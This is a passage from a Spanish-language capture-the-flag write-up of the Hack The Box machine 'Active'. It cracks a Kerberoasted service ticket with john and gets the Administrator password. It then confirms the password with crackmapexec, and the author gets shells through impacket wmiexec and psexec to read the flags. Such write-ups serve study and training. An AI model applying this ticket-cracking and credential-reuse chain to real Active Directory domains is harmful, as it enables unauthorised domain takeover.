ecd3de2bf13438e89604af38ac9a796cc7c728ac7527c77dfdc414ceb7ffa06912fd7cc85d83ba82fdd988ff2defde5b029731c28c431daf60a176b9d618c55b957c5414b5ff03c287fc4595cc7171a13f894010888da18b315cb9c8a1c3b7c50ab32129239cf8c08312cc5e0a4d82f9a2caf9146d17da9128d213bae4212b4814f28a5052c892a52c30d5b890312a552a87c2870b768217fc5b547883c36b2e80d2c5fd6be140ee54f0b9c092eb739df0f3c9a445aa78d0073e9f95c31b2b9990b219db46b7f4050184798e28ec4e2583ff7ae1deb83b5ee62b903d792137a8909e3f84b64abb9288abfc7e4a999fbb419bd765c85c550e14dfc8bf8462aee29504c4a2ac78aa353c580b1c1463b2e1ba214fb70b3ef351448bcd3acfb4a1fd115ca4726fd767ed13a13b0a7a284101b541744402f
```

Perfecto, ahora si se genera el ticket, intentemos crackearlo. Tomamos todo el Ticket, lo pegamos en un archivo (o con el propio **GetUserSPNs.py** pasándole el argumento `-outputfile <file_name>`) y haciendo uso de **john** podemos indicarle:

```bash
ゝ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hash.SPN 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:24 DONE (2021-05-13 23:24) 0.04091g/s 431148p/s 431148c/s 431148C/s Tickle7..Tibor
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obtenemos como contraseña en texto plano: ***Ticketmaster1968***. Por lo cual, podríamos probarla contra el usuario **Administrator** del sistema a ver si conseguimos algo :P

Validamos que las credenciales sean funcionales y sobre todo que sean poderosas:

```bash
ゝ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

Lindo, vemos que son válidas, pero sobre todo vemos algo que dice "**Pwn3d**", esto nos indica que somos los duros del sistema con estas credenciales, o sea, podemos hacer de todo ;)

...

#### Obtención terminal con el usuario Administrator

Usaremos dos herramientas:

##### ¬ wmiexec 

Podemos apoyarnos de la herramienta [wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) (del conjunto **impacket**) para entablarnos una terminal en una máquina, ya sea con credenciales o en caso de contar con hashes también podríamos:

![148bash_wmiexec_admin_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148bash_wmiexec_admin_done.png)

LISTONEEEEEEEEEEEES, ya podríamos interactuar a full con el DC.

##### ¬ psexec

Podemos aprovechar la ocasión para probar la herramienta [psexec](https://www.luaces-novo.es/winexe-el-psexec-para-linux/) que también nos permite ejecutar comandos, usémosla para obtener una terminal:

![148bash_psexec_admin_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148bash_psexec_admin_done.png)

Y también obtenemos una cmd :)

Solo nos quedaría ver las flags:

![148flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148flags.png)

...

Esto es todo por esta máquina, muy entretenida, mi primer recorrido por un **DC**, había hecho la máquina **Sauna**, pero no la documente y muuuuy pocas cosas me acordaba de ella, así que esta me sirvió como nuevo punto de partida para estas máquinas que se pueden volver muy locas y difíciles, pero a la vez divertidas (:

Y nada, a seguir rompiendo todo! Nos leeremos luego <3